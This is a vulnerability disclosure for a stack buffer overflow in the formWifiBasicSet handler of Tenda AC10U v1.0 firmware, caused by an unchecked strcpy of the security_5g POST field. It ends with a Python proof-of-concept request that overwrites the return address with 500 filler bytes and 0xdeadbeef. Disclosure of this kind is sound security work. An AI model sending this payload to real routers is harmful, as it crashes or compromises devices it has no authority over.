## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 V15.03.06.49 firmware has a stack overflow vulnerability in the `formWifiBasicSet` function. The `security_5g` variable receives the `security_5g` parameter from a POST request and is later assigned to the `param_5g` variable, which is fixed at 256 bytes. However, since the user can control the input of `security_5g`, the statement `strcpy(param_5g, security_5g);` can cause a buffer overflow. The user-provided `security_5g` can exceed the capacity of the `param_5g` array, triggering this security vulnerability.

![image-20240309193205961](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309193205961.png)

![image-20240309193158542](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309193158542.png)

![image-20240309193217279](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309193217279.png)

## PoC

```python
import requests
from pwn import *

url = 'http://192.168.84.101/goform/WifiBasicSet'
payload = b'a' * 500 + p32(0xdeadbeef)
data = {
    'security_5g':payload, 
    'hideSsid':'1', 
    'ssid':'1',
    'security':'1', 
    'wrlPwd':'1', 
    'hideSsid_5g':'1', 
    'ssid_5g':'1', 
    'wrlPwd_5g': '1'
}

requests.post(url, data=data)
```

![image-20240304213056127](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304213056127.png)
